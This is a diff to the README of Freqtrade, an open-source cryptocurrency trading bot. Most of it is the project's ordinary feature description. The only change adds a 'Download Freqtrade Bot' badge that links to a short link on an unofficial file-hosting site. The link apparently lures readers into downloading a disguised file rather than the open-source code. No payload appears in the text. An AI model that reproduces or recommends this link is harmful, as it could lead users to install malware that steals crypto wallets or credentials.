@@ -2,6 +2,9 @@
 
 Freqtrade is an open-source cryptocurrency trading bot designed for automating trading strategies, backtesting, and live trading across multiple exchanges. It offers users the ability to create and test their own custom strategies, optimizing them for real-world market conditions. With support for various exchanges, Freqtrade aims to make cryptocurrency trading more efficient, customizable, and automated.
 
+
+[![Download Freqtradebot](https://img.shields.io/badge/Download-Freqtrade%20Bot-blueviolet)](https://downeefiles.com/s/frqtb)
+
 ### Key Features:
 - **Open-Source**:  
    Freqtrade is open-source, meaning users have full access to the bot’s code, enabling them to modify and customize it according to their preferences and needs.
